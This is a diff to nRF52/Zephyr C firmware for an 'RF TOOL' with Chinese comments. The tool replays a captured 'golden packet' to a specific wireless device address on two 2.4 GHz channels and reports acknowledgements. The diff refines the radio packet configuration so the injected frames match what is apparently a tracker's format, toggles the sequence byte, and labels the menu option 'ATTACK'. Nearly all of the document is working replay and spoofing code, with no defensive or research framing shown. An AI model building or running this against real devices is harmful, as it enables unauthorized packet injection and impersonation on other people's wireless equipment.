@@ -8,14 +8,17 @@
 #include <stdint.h>
 
 // ================= 參數設定 =================
-static const uint8_t TARGET_FREQS[] = {4, 78}; // 2404 & 2478 MHz
+static const uint8_t TARGET_FREQS[] = {4, 78};
 #define TARGET_ADDR_BASE   0xd235cf35
 #define TARGET_ADDR_PREFIX 0x00
 
-// ================= 數據庫 (你的黃金封包) =================
-// Data: 16 00 00 21 20 80 0F AF F0 00 00 C0 0D FF F0 0F CF 00 29 79 10 27 68 D8 2A 88 31 98 23 00 00 00
-static uint8_t GOLDEN_PACKET[] = {
-    0x16, 0x00, 0x00, 0x21, 0x20, 0x80, 0x0F, 0xAF, 
+// ================= 數據庫 =================
+// 黃金封包: 16 00 00 21 20 80 0F AF...
+// 我們需要把這個封包拆解，餵給硬體去組裝
+static uint8_t GOLDEN_PAYLOAD[] = {
+    // 注意：這裡不包含第一個 Byte (16)，因為 16 是長度，會由硬體自動處理
+    // 這裡從 00 00 21... 開始
+    0x00, 0x00, 0x21, 0x20, 0x80, 0x0F, 0xAF, 
     0xF0, 0x00, 0x00, 0xC0, 0x0D, 0xFF, 0xF0, 0x0F, 
     0xCF, 0x00, 0x29, 0x79, 0x10, 0x27, 0x68, 0xD8, 
     0x2A, 0x88, 0x31, 0x98, 0x23, 0x00, 0x00, 0x00
@@ -31,12 +34,11 @@ static uint8_t packet_buffer[64];
 static bool attack_active = false;
 static bool swap_address = false;
 
-// 反轉地址函數
 uint32_t reverse_32(uint32_t n) {
     return ((n>>24)&0xff) | ((n<<8)&0xff0000) | ((n>>8)&0xff00) | ((n<<24)&0xff000000);
 }
 
-void radio_init_mirror(void) {
+void radio_init_s1_match(void) {
     NRF_RADIO->POWER = 0;
     k_busy_wait(500);
     NRF_RADIO->POWER = 1;
@@ -44,21 +46,23 @@ void radio_init_mirror(void) {
     // 最大功率
     NRF_RADIO->TXPOWER = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);
 
-    // CRC 設定 (必須開啟)
     NRF_RADIO->CRCCNF = (RADIO_CRCCNF_LEN_Two << RADIO_CRCCNF_LEN_Pos);
     NRF_RADIO->CRCPOLY = 0x11021; 
     NRF_RADIO->CRCINIT = 0xFFFF;
     NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 
     
-    // ★★★ 設定為固定長度模式 (Fixed Length) ★★★
-    // LFLEN = 0 (不使用長度欄位)
-    NRF_RADIO->PCNF0 = (0UL << RADIO_PCNF0_LFLEN_Pos);
+    // ★★★ 關鍵修正：完全模仿追蹤器的 PCNF0 (00040008) ★★★
+    // LFLEN = 8 bits
+    // S0LEN = 0
+    // S1LEN = 4 bits (這能解決 Bit Shift 問題)
+    NRF_RADIO->PCNF0 = (8UL << RADIO_PCNF0_LFLEN_Pos) | 
+                       (4UL << RADIO_PCNF0_S1LEN_Pos);
     
-    // STATLEN = 32 (強制發送/接收 32 Bytes)
-    NRF_RADIO->PCNF1 = (32UL << RADIO_PCNF1_STATLEN_Pos) | 
-                       (32UL << RADIO_PCNF1_MAXLEN_Pos)  | 
-                       (4UL  << RADIO_PCNF1_BALEN_Pos)   | 
-                       (1UL  << RADIO_PCNF1_ENDIAN_Pos);
+    // PCNF1
+    NRF_RADIO->PCNF1 = (60UL << RADIO_PCNF1_MAXLEN_Pos) | 
+                       (4UL  << RADIO_PCNF1_BALEN_Pos) | 
+                       (1UL  << RADIO_PCNF1_ENDIAN_Pos) |
+                       (32UL << RADIO_PCNF1_STATLEN_Pos);
     
     NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
     NRF_RADIO->PREFIX0 = TARGET_ADDR_PREFIX; 
@@ -67,7 +71,6 @@ void radio_init_mirror(void) {
 }
 
 void send_on_freq(uint8_t freq) {
-    // 1. 停用 Radio
     NRF_RADIO->SHORTS = 0;
     NRF_RADIO->TASKS_DISABLE = 1;
     while (NRF_RADIO->EVENTS_DISABLED == 0);
@@ -75,18 +78,27 @@ void send_on_freq(uint8_t freq) {
 
     NRF_RADIO->FREQUENCY = freq;
     
-    // 地址設定 (正常 vs 反轉)
     if (swap_address) NRF_RADIO->BASE0 = reverse_32(TARGET_ADDR_BASE);
     else NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
 
-    // 2. 準備數據 (自動切換 16/1C)
-    static int toggle_cnt = 0;
-    GOLDEN_PACKET[0] = (toggle_cnt++ % 2 == 0) ? 0x16 : 0x1C;
+    // 準備封包
+    // 這裡有玄機：
+    // packet_buffer[0] = Length (我們填 0x16)
+    // packet_buffer[1] = S1 (前4bit) + Payload開頭 (後4bit)
     
-    memcpy(packet_buffer, GOLDEN_PACKET, 32); 
+    // 為了自動切換 SN (16 / 1C)，我們修改 Length 欄位
+    // 雖然 0x16 是長度，但 BLE 中 SN 其實藏在 Header 裡
+    // 我們直接讓硬體發送我們抓到的 Raw Bytes，但利用 S1LEN 設定讓它對齊
+    
+    static int toggle_cnt = 0;
+    uint8_t header_byte = (toggle_cnt++ % 2 == 0) ? 0x16 : 0x1C;
+    
+    packet_buffer[0] = header_byte; // Length / Header
+    memcpy(&packet_buffer[1], GOLDEN_PAYLOAD, sizeof(GOLDEN_PAYLOAD));
+    
     NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;
 
-    // 3. 啟動 Turbo Shortcuts (自動 TX -> RX)
+    // Turbo Shortcuts
     NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk | 
                         RADIO_SHORTS_END_DISABLE_Msk | 
                         RADIO_SHORTS_DISABLED_RXEN_Msk |
@@ -94,10 +106,9 @@ void send_on_freq(uint8_t freq) {
 
     NRF_RADIO->TASKS_TXEN = 1;
 
-    // 4. 等待流程 (TX + T_IFS + ACK)
     k_busy_wait(200); 
 
-    // 5. 檢查 ACK
+    // Check ACK
     int timeout_counter = 2000;
     bool ack_received = false;
     
@@ -112,11 +123,9 @@ void send_on_freq(uint8_t freq) {
         k_busy_wait(1);
     }
 
-    // 清理
     NRF_RADIO->SHORTS = 0;
     NRF_RADIO->TASKS_DISABLE = 1;
 
-    // 回報結果
     if (ack_received) {
         int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
         printk(">>> [HIT!] ACK RECEIVED on %d MHz | RSSI: %d\n", 2400+freq, rssi);
@@ -127,12 +136,10 @@ void send_on_freq(uint8_t freq) {
 }
 
 void print_menu() {
-    printk("\n\n=== RF TOOL v6.0 (Golden Packet Mirror) ===\n");
-    printk(" [1] ATTACK: Send Captured Packet (32 Bytes)\n");
+    printk("\n\n=== RF TOOL v7.0 (S1 Bit-Alignment Fix) ===\n");
+    printk(" [1] ATTACK: Golden Packet (Matched PCNF0)\n");
     printk(" [6] Toggle Address Swap (Current: %s)\n", swap_address ? "SWAPPED" : "NORMAL");
     printk(" [0] STOP\n");
-    printk("----------------------------------------\n");
-    printk(" Current: %s\n", attack_active ? "FIRING" : "IDLE");
 }
 
 void uart_cb(const struct device *dev, void *user_data) {
@@ -144,7 +151,7 @@ void uart_cb(const struct device *dev, void *user_data) {
         switch (c) {
             case '1':
                 attack_active = true;
-                printk("\n>>> FIRING GOLDEN PACKET...\n");
+                printk("\n>>> FIRING (S1 Corrected)...\n");
                 break;
             case '6':
                 swap_address = !swap_address;
@@ -168,7 +175,7 @@ int main(void) {
     uart_irq_callback_user_data_set(uart_dev, uart_cb, NULL);
     uart_irq_rx_enable(uart_dev);
 
-    radio_init_mirror(); 
+    radio_init_s1_match(); 
     k_sleep(K_SECONDS(2));
     print_menu();
 
